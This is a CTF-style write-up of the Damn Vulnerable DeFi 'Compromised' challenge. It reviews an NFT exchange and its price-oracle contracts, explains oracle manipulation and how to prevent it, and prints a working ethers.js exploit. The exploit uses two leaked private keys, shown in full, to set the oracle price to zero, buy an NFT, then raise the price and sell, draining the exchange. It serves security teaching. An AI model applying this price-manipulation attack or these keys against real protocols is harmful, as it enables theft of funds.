<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/7.png">

# Target Contract Review

Given contracts.

**Exchange.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./TrustfulOracle.sol";
import "../DamnValuableNFT.sol";

/**
 * @title Exchange
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Exchange is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public immutable token;
    TrustfulOracle public immutable oracle;

    error InvalidPayment();
    error SellerNotOwner(uint256 id);
    error TransferNotApproved();
    error NotEnoughFunds();

    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);

    constructor(address _oracle) payable {
token = new DamnValuableNFT();
token.renounceOwnership();
oracle = TrustfulOracle(_oracle);
    }

    function buyOne() external payable nonReentrant returns (uint256 id) {
if (msg.value == 0)
    revert InvalidPayment();

// Price should be in [wei / NFT]
uint256 price = oracle.getMedianPrice(token.symbol());
if (msg.value < price)
    revert InvalidPayment();

id = token.safeMint(msg.sender);
unchecked {
    payable(msg.sender).sendValue(msg.value - price);
}

emit TokenBought(msg.sender, id, price);
    }

    function sellOne(uint256 id) external nonReentrant {
if (msg.sender != token.ownerOf(id))
    revert SellerNotOwner(id);
    
if (token.getApproved(id) != address(this))
    revert TransferNotApproved();

// Price should be in [wei / NFT]
uint256 price = oracle.getMedianPrice(token.symbol());
if (address(this).balance < price)
    revert NotEnoughFunds();

token.transferFrom(msg.sender, address(this), id);
token.burn(id);

payable(msg.sender).sendValue(price);

emit TokenSold(msg.sender, id, price);
    }

    receive() external payable {}
}
```

The `Exchange` contract is a smart contract that allows users to buy and sell NFTs.

The `Exchange` contract has two main state variables: `token` and `oracle`. **The token variable is an instance of the DamnValuableNFT contract, which represents the NFT being traded on the exchange**. **The oracle variable is an instance of the TrustfulOracle contract, which is used to get the current price of the NFT**.

`buyOne()` : Allows users to **buy an NFT by sending the required payment**. The payment must be equal to or greater than the current price of the NFT according to the oracle. If the payment is valid, the function mints a new NFT for the buyer and sends any excess payment back to the buyer.

`sellOne()` :  Allows users to **sell their NFTs**. The user must be the owner of the NFT and the NFT must be approved for transfer to the exchange contract. If these conditions are met, the function transfers the NFT to the exchange contract, burns the NFT, and sends the payment to the seller.

Additionally, the contract includes a `receive()` to allow the contract to receive Ether payments.

**TrustfulOracle.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControlEnumerable.sol";
import "solady/src/utils/LibSort.sol";

/**
 * @title TrustfulOracle
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A price oracle with a number of trusted sources that individually report prices for symbols.
 * The oracle's price for a given symbol is the median price of the symbol over all sources.
 */
contract TrustfulOracle is AccessControlEnumerable {
    uint256 public constant MIN_SOURCES = 1;
    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
    bytes32 public constant INITIALIZER_ROLE = keccak256("INITIALIZER_ROLE");

    // Source address => (symbol => price)
    mapping(address => mapping(string => uint256)) private _pricesBySource;

    error NotEnoughSources();

    event UpdatedPrice(address indexed source, string indexed symbol, uint256 oldPrice, uint256 newPrice);

    constructor(address[] memory sources, bool enableInitialization) {
if (sources.length < MIN_SOURCES)
    revert NotEnoughSources();
for (uint256 i = 0; i < sources.length;) {
    unchecked {
_setupRole(TRUSTED_SOURCE_ROLE, sources[i]);
++i;
    }
}
if (enableInitialization)
    _setupRole(INITIALIZER_ROLE, msg.sender);
    }

    // A handy utility allowing the deployer to setup initial prices (only once)
    function setupInitialPrices(address[] calldata sources, string[] calldata symbols, uint256[] calldata prices)
external
onlyRole(INITIALIZER_ROLE)
    {
// Only allow one (symbol, price) per source
require(sources.length == symbols.length && symbols.length == prices.length);
for (uint256 i = 0; i < sources.length;) {
    unchecked {
_setPrice(sources[i], symbols[i], prices[i]);
++i;
    }
}
renounceRole(INITIALIZER_ROLE, msg.sender);
    }

    function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
_setPrice(msg.sender, symbol, newPrice);
    }

    function getMedianPrice(string calldata symbol) external view returns (uint256) {
return _computeMedianPrice(symbol);
    }

    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory prices) {
uint256 numberOfSources = getRoleMemberCount(TRUSTED_SOURCE_ROLE);
prices = new uint256[](numberOfSources);
for (uint256 i = 0; i < numberOfSources;) {
    address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
    prices[i] = getPriceBySource(symbol, source);
    unchecked { ++i; }
}
    }

    function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
return _pricesBySource[source][symbol];
    }

    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
uint256 oldPrice = _pricesBySource[source][symbol];
_pricesBySource[source][symbol] = newPrice;
emit UpdatedPrice(source, symbol, oldPrice, newPrice);
    }

    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
uint256[] memory prices = getAllPricesForSymbol(symbol);
LibSort.insertionSort(prices);
if (prices.length % 2 == 0) {
    uint256 leftPrice = prices[(prices.length / 2) - 1];
    uint256 rightPrice = prices[prices.length / 2];
    return (leftPrice + rightPrice) / 2;
} else {
    return prices[prices.length / 2];
}
    }
}
```

The `TrustfulOracle` contract is a price oracle that aggregates prices from multiple trusted sources and calculates the median price for a given symbol. It ensures trustworthiness by allowing only trusted sources to post prices.

In the constructor, initializes the contract by setting the trusted sources and enabling initialization by the deployer.

`setupInitialPrices()` : Allows the deployer to set up initial prices for symbols during contract initialization.

`postPrice()` : Allows trusted sources to post prices for symbols.

`getMedianPrice()` : Returns the median price for a symbol based on the prices reported by all trusted sources.

`getAllPricesForSymbol()` : Returns an array of prices reported by all trusted sources for a given symbol.

`getPriceBySource()` : Returns the price reported by a specific source for a given symbol.

`_setPrice()` : Updates the price reported by a source for a given symbol.

`_computeMedianPrice()` : Calculates the median price for a symbol based on the prices reported by all trusted sources.



**TrustfulOracleInitializer.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { TrustfulOracle } from "./TrustfulOracle.sol";

/**
 * @title TrustfulOracleInitializer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrustfulOracleInitializer {
    event NewTrustfulOracle(address oracleAddress);

    TrustfulOracle public oracle;

    constructor(address[] memory sources, string[] memory symbols, uint256[] memory initialPrices) {
oracle = new TrustfulOracle(sources, true);
oracle.setupInitialPrices(sources, symbols, initialPrices);
emit NewTrustfulOracle(address(oracle));
    }
}
```


In the constructor of the `TrustfulOracleInitializer` contract, three arrays are passed as arguments: sources, symbols, and initialPrices. These arrays represent the sources of price data, the corresponding symbols of the assets, and the initial prices of the assets, respectively.

The constructor creates a new instance of the `TrustfulOracle` contract and assigns it to the `oracle` variable. Then, it calls the `setupInitialPrices()` function of the oracle contract, passing the sources, symbols, and initialPrices arrays as arguments.

Finally, the contract emits an event `NewTrustfulOracle` with the address of the newly created oracle contract.

This contract can be used as a starting point to deploy and initialize a `TrustfulOracle` contract with the desired price feed data.

Challenge's message:

> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:

```url
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

> A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.
This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.
Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.

# Price Oracle Manipulation

Before read this part, I would really recomend check [**this article**](https://ethereum.org/en/developers/docs/oracles/) if you don't know what is the oracles in the blockchain.

Oracle manipulation attacks exploit vulnerabilities within an oracle system's structure, typically aiming to coerce the oracle into providing inaccurate information. The primary objective of such an attack is to compel the oracle to deliver **false data**, ultimately leading to erroneous executions within a smart contract reliant on data from the compromised oracle. In this challenge, we will focus on **data sources**. 

Attackers frequently focus on the data source in oracle manipulation attacks because the quality of information provided by the oracle hinges on it. A classic illustration of such attacks is `spot price manipulation`.

A lending protocol that employs overcollateralization relies on the real-time spot price of an asset, sourced from a decentralized exchange such as Uniswap, to assess the worth of a user's collateral. **This methodology plays a crucial role in establishing the user's borrowing capacity and in monitoring when their debt position approaches an undercollateralized state**.


**An attacker can manipulate token prices on a specific market using flash loans to generate fake demand, consequently causing the decentralized exchange (DEX), which serves as a price oracle, to register unusually high prices for the token**. This deceptive pricing information can then lead the lending protocol to inaccurately assess the value of collateral provided by users, resulting in the issuance of **bad loans**. Here is the example attack looks like:

<p align="center"><img height="350" src="https://redefine.net/img/media/oracle-post/oracle-manipulation.png"></p>

## Effects Of Oracle Manipulation

### Protocol Insolvency


Manipulating oracles poses a significant challenge for lending protocols, as it has the potential to trigger widespread insolvency. To illustrate, an oracle exploit could cause the protocol to **generate instances of bad debt, wherein the value of the collateral falls below the amount of debt owed by users**. **In such a scenario, liquidity providers would bear the brunt of losses, as borrowers would lack motivation to repay their debts**.

### Poor User Experience


DeFi money markets prevent insolvency by constantly **monitoring the market value of collateral assets and initiating debt position liquidations in advance to prevent undercollateralization**. However, such liquidations could be unjustified if the protocol relies on inaccurate oracle data for its calculations.



### Economic Failure

Oracle exploits can have far-reaching consequences beyond protocol insolvency, as evidenced by scenarios where algorithmic stablecoins and rebase tokens risk losing their price stability due to erroneous price data provided by oracles.


## Prevention Of Oracle Manipulation Attacks

### Understand Oracle Design Patterns

Understanding oracle design patterns is crucial for safeguarding against price oracle manipulation attacks in the realm of DeFi. These attacks often exploit vulnerabilities **in the oracle's data sources or aggregation methods to manipulate price feeds and deceive smart contracts into executing malicious transactions**. 

By comprehending these design patterns, DeFi projects can implement preventive measures such as **utilizing multiple**, **reputable data sources**, **employing robust consensus mechanisms**, and regularly auditing their oracle infrastructure. This proactive approach not only enhances the security and reliability of price oracles but also fortifies the overall **integrity of the DeFi ecosystem**, making it more resilient against potential exploits and ensuring the trustworthiness of financial transactions executed on blockchain platforms.

### Use Decentralized Oracles

Utilizing decentralized oracles is a proactive approach to thwarting price oracle manipulation attacks.**These decentralized oracles source data from multiple, independent data providers, making it significantly more challenging for any single entity to manipulate the data feed**. 

By relying on a network of validators and consensus mechanisms, **decentralized oracles enhance the security and integrity of price data, reducing the vulnerability of smart contracts and DeFi platforms to fraudulent price manipulation**. This approach not only helps safeguard the integrity of financial systems built on blockchain technology but also reinforces trust in decentralized applications and services across the ecosystem.

If you want more about this topic, you can check [**this article**](https://scsfg.io/hackers/oracle-manipulation/).

# Subverting

When we decode this values from the request in the **cyberchef** tool, we can get oracle's wallets private keys.

![image](https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/e28d2a4f-c900-4465-9b58-87d0bac4f67d)



![image](https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/afdf0559-ea1f-483a-a3c8-eb301acc6863)

We can confirm that these private keys grant access to the oracle's trusted accounts. **The vulnerability lies in the potential misuse of these keys to sign transactions, enabling price manipulation within the oracle**. This manipulation could be exploited for profit by executing **buy-low**, **sell-high** strategies to deplete the exchange's resources.

Here are the attacker commands:

```js
const privateKeys = [
    "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
    "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
];

// create wallets with private keys
const wallet1 = new ethers.Wallet(privateKeys[0], ethers.provider);
const wallet2 = new ethers.Wallet(privateKeys[1], ethers.provider);

// set the NFT's price is 0
await oracle.connect(wallet1).postPrice("DVNFT",0);
await oracle.connect(wallet2).postPrice("DVNFT",0);

await exchange.connect(player).buyOne({ value: ethers.utils.parseEther("0.01") });

const sellPrice = await ethers.provider.getBalance(exchange.address);

// update the balance to the exchange's balance
await oracle.connect(wallet1).postPrice("DVNFT",sellPrice);
await oracle.connect(wallet2).postPrice("DVNFT",sellPrice);

// give permission to sell this NFT 
await nftToken.connect(player).approve(exchange.address, 0);

await exchange.connect(player).sellOne(0);
```

Solve the challenge.

```powershell
  Compromised challenge
    ✔ Execution (182ms)


  1 passing (3s)

Done in 3.58s.
```


## Security Takeaways

- ***Apply the same security precautions to Web2 services as you would to Web3***.
- ***Distribute private keys across multiple server locations rather than centralizing them all in one place***.
- ***Refrain from storing private keys linked to services that can be accessed via the public internet***.

**_by wasny0ps_**
